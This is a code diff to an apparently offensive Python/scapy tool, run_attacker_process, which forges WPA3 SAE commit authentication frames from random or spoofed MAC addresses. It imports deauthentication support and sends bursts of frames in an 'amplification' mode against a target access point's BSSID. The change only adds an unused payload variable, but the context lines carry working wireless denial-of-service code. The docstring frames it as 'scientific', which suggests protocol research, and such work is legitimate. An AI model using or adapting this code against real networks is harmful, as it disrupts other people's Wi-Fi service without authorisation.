@@ -303,7 +303,7 @@ def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
 def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex_list, finite_hex_list,
                          counter, sta_macs=None, amplification_targets=None, opposite_bssid=None):
     """Scientific attack implementation with list-based SAE rotation"""
-    from scapy.all import RandMAC, Dot11, RadioTap, Dot11Auth, Dot11Deauth, sendp
+    from scapy.all import RandMAC, Dot11, RadioTap, Dot11Auth, Dot11Deauth, sendp, Raw
     
     if not set_channel_scientific(interface, channel):
         logger.error(f"[ATTACK] {interface}: Channel setup failed")
@@ -324,6 +324,7 @@ def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex_list
 
     def make_sae_commit(mac, seq=1):
         scalar, finite = get_random_sae()
+        sae_payload = SAE_GROUP_ID_19 + scalar + finite
         return RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=mac, addr3=bssid)/\
                Dot11Auth(algo=3, seqnum=seq, status=0)/SAE_GROUP_ID_19/scalar/finite
 
@@ -378,6 +379,7 @@ def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex_list
                 if amplification_targets and len(amplification_targets) >= 2:
                     src, dst = random.sample(amplification_targets, 2)
                     scalar, finite = get_random_sae()
+                    sae_payload = SAE_GROUP_ID_19 + scalar + finite
                     p = RadioTap()/Dot11(type=0, subtype=11, addr1=dst, addr2=src, addr3=dst)/\
                         Dot11Auth(algo=3, seqnum=1, status=0)/SAE_GROUP_ID_19/scalar/finite
                     packets = [p] * BURST_SIZE
